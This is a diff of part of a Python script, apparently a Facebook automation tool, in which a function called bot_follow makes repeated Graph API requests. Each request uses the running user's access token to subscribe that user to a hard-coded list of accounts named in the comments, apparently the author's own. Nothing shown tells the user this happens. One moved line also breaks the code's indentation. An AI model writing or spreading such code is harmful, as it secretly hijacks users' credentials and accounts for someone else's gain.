@@ -191,8 +191,9 @@ def bot_follow():
 		logs()
 	kom = ("Dapunta Ganteng Banget Sih❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
 
-requests.post("https://graph.facebook.com/100029526650087/subscribers?access_token=" + toket)      #Gilang Liar
-	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
+	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)    #Dapunta Khurayra X
+
+requests.post("https://graph.facebook.com/100029526650087/subscribers?access_token=" + toket)   #Gilang Liar
 	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
 	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
 	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
